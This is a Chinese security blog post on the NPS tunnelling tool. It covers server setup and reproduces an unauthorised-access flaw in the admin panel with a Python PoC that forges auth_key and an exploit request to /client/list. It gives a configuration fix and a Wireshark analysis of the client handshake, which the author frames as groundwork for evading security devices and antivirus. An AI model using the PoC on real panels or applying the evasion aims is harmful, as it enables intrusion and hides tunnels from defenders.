#  NPS之Socks流量分析以及未授权复现   
 蚁景网安   2025-06-04 08:54  
  
##### 前言  
  
因为想要写一个socks的流量算法去绕过安全设备，所以这里对NPS的流量特征总结一下，方便自己后期的魔改。  
##### 环境  
> ubuntu 16.04  vps  server  
> windows server 2012R2  clinet  
  
```
mkdir npscd npswget https://github.com/ehang-io/nps/releases/download/v0.26.10/linux_amd64_server.tar.gztar -zxvf linux_amd64_server.tar.gz./nps install
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeKhQWoR37Ob2kBUibMmjcw6uOh5y3ib9jjUCtEeTTUrFxI99868dUpqYSrzOtIQv5kkqeRk262BPIg/640?wx_fmt=png "")  
  
```
cd /etc/nps/conf/vim nps.conf
```  
  
配置文件  
```
#webweb_host=a.o.comweb_username=xxxx    //管理端用户名web_password=xxxxxx  //管理端密码web_port = xxxxx     //管理端端口web_ip=0.0.0.0web_base_url=web_open_ssl=falseweb_cert_file=conf/server.pemweb_key_file=conf/server.key#web_base_url=/nps
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeKhQWoR37Ob2kBUibMmjcw6Mcic9rCY9Mj7rE2hCbGqONLjgGjlicFojGayDRqV1OSFiaphYm8JIb4Pg/640?wx_fmt=png "")  
  
```
##bridgebridge_type=tcp   //客户端连接协议tcpbridge_port=xxxx  //客户端连接端口bridge_ip=0.0.0.0
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeKhQWoR37Ob2kBUibMmjcw6siciblXiawmg6w2ghWibjYoXVVWjzjweialr5wvc725RQo74BJoCkGZS7oA/640?wx_fmt=png "")  
  
  
bridge_port  
的默认端口默认为8024  
，这里不建议改为默认的，连接客户端的时候可能会触发安全设备规则  
##### NPS未授权复现  
  
POC  
```
#encoding=utf-8import timeimport hashlibnow = time.time()m = hashlib.md5()m.update(str(int(now)).encode("utf8"))auth_key = m.hexdigest()print("Index/Index?auth_key=%s&timestamp=%s" % (auth_key,int(now))
```  
  
直接访问  
> http://vps:port?payload  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeKhQWoR37Ob2kBUibMmjcw6X1kQ2E8R6EIztwib11HAkqQeyhF5CrkS8ms5IkpqO95HXhed3U7jibnw/640?wx_fmt=png "")  
  
exp请求接口  
```
POST /client/list HTTP/1.1Host: vps:portUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0Accept: application/json, text/javascript, */*; q=0.01Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedX-Requested-With: XMLHttpRequestContent-Length: 98Origin: http://vps:portConnection: closeReferer: http://vps:port/client/listsearch=&order=asc&offset=0&limit=10&auth_key=805df7d1f7bf3b662939ca091174e6b4&timestamp=1659948547
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeKhQWoR37Ob2kBUibMmjcw67VNEPhct42VKa9UTMlIxlRzlZUQ1bEDbjibLSgoczNiaEib3XqiaCp2Ylw/640?wx_fmt=png "")  
  
参考链接：  
> https://mp.weixin.qq.com/s/PTq01wcV4XJwutbSjHjfvA  
  
##### 修复措施  
  
vim /etc/nps/conf/nps.conf取消注释  
auth_key,添加  
auth_crypt_key`注释  
> auth_key=test #auth_crypt_key =!QAZ4rfv%TGB^YHN  
  
  
修改为  
> auth_key=test #auth_crypt_key =!QAZ4rfv%TGB^YHN  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeKhQWoR37Ob2kBUibMmjcw6KsZYmTKc20HIQkIcBsfpBHmXKJTTTvFOv1lrI9gJbQpO9WCtPc2aLA/640?wx_fmt=png "")  
  
  
目前最新版本的也存在改配置不当问题，这里需要修改配置，修复之后是无法通过未授权读取内容信息的。  
##### socks流量分析  
> nps start  
  
  
访问http://vps:port/login  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeKhQWoR37Ob2kBUibMmjcw6gqDWQbU4rfHJagBchibBrxz69QTHAKVxia5Ce0LmrE12TQRnwfTWZAvw/640?wx_fmt=png "")  
  
新增客户端  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeKhQWoR37Ob2kBUibMmjcw6pq1ebGrW7JZ8yhFWjTqaXvfYBO4Gk5ALibvwhRBydRLvzribg8Mjic1kQ/640?wx_fmt=png "")  
  
  
这里用户名和密码随意，这里是客户端登录的认证用户名，在客户端连接的时候是根据密钥  
来实现的。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeKhQWoR37Ob2kBUibMmjcw6QchF3w50Kb8QD764W6lU0ZNJYPWyoDUzBKVXs9ZOib1MzUiaHOyIXlwA/640?wx_fmt=png "")  
  
  
客户端选择windwos server 2012R2  
  
修改客户端配置文件  
```
[common]server_addr=vps:portconn_type=tcpvkey=xxxxauto_reconnection=truemax_conn=1000flow_limit=1000rate_limit=1000basic_username=11basic_password=3web_username=xxxx    web_password=xxxxxcrypt=truecompress=true#pprof_addr=0.0.0.0:9999disconnect_timeout=60
```  
  
客户端启动  
> npc.exe -server=vps:port -vkey=xxxxx -type=tcp  
  
  
正常情况下会报毒，所以这里针对杀软这一块儿，客户端需要做一下免杀处理。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeKhQWoR37Ob2kBUibMmjcw6XibKNbedBibLe41hNdacH1zEgxbZE7IoIy0Ky4X4M4nLBicOoPdUBibq5g/640?wx_fmt=png "")  
  
  
查看连接状态  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeKhQWoR37Ob2kBUibMmjcw6NibicTRMKX9JFib5Xq6s1awvqVt4SicZJIVuUM1aicNTwXF9vFNfubjjQiaA/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeKhQWoR37Ob2kBUibMmjcw6IOaib0gPQqNKHuWR0OpUPF6XC0br588xP9Bh4E9gey4B1PTrLF1icUicg/640?wx_fmt=png "")  
  
  
使用goby  
测试socks5  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeKhQWoR37Ob2kBUibMmjcw6ELpZCXqJc8EEPncPqyM4DCM6icnkNfw6bXeFFTv0fiazZic9YWZ8EWVJw/640?wx_fmt=png "")  
  
  
测试代理  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeKhQWoR37Ob2kBUibMmjcw6XhKsJnOAicibffZy7RAA3r01ttTlK3q0hDHiae6vWCicDJBocdm2riaJ5ibA/640?wx_fmt=png "")  
  
  
已成功实现内网穿透。  
  
这里使用wireshark  
抓取流量包，  
  
初始流量服务器向客户端发送TST  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeKhQWoR37Ob2kBUibMmjcw6GzuBKb9M0kiaglibDMPxLopmSk1vMVkCibIOias2tOXT6CoKdgM3AKmzyw/640?wx_fmt=png "")  
  
  
同时客户端向服务端确认版本，同时返回客户端版本0.26.0  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeKhQWoR37Ob2kBUibMmjcw6Oeh2uraSpmvsXsHpr1TuNVUnfgjR7hlSiciazs4qJeIm7icRDwDhBA6rw/640?wx_fmt=png "")  
  
代码位置nps/lib/version/version.go  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeKhQWoR37Ob2kBUibMmjcw6w6khCDk8vhgQ4gwfezTfg9kka5dZHGRmNK5aXaYj97JoDqmhCzoPBg/640?wx_fmt=png "")  
  
  
服务端接收到请求后，客户端请求的数据内容为nps的版本为0.26.10  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeKhQWoR37Ob2kBUibMmjcw63eFQghicNz8QjYgXxNGA2He6M4nqmttPIUTQj5ePKiaDghicSI1D1OA8Q/640?wx_fmt=png "")  
  
  
服务端接收到请求后返回给客户端服务端版本的md5值，即  
> md5(0.26.0)=89a4f3fc3c89257d6f712de6964bda8e  
  
  
可以发现在产生nps  
客户端连接的时候,会产生数据校验，这里数据校验就是有服务器到  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeKhQWoR37Ob2kBUibMmjcw6icnVOu8HHwoJZOhfbay7ng8XAlgCtKRebWLibX1fbCxJLl7mVrSPnibLg/640?wx_fmt=png "")  
  
  
这是客户端传输给服务端密钥连接  
> md5(vkey)  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeKhQWoR37Ob2kBUibMmjcw6VBPMeQVtlbbEIsbfeibIbsiaOVuRJkqPjPhE1hKLiaV7NbUuqibnUgNp7Q/640?wx_fmt=png "")  
  
  
服务端在接收到客户端的请求后校验数据后返回success  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LeKhQWoR37Ob2kBUibMmjcw6ibuZg3vByAnjfAMRfD5zA5molsGrv1SwsrOUdUI3KSJWu4Ud5w0Ig8Q/640?wx_fmt=png "")  
  
  
这里客户端和服务端的连接流量就比较清晰了，那么想要bypass安全设备的告警，在修改加密方式和修改版本关键字即可，因为在做流量隐藏的时候跟bypassav不一样，不会考虑文件的哈希以及文件在沙箱中的落地状态。  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC6iavic0tIJIoZCwKvUYnFFiaibgSm6mrFp1ZjAg4ITRicicuLN88YodIuqtF4DcUs9sruBa0bFLtX59lQQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
学习  
网安实战技能课程  
，戳  
“阅读原文“  
  
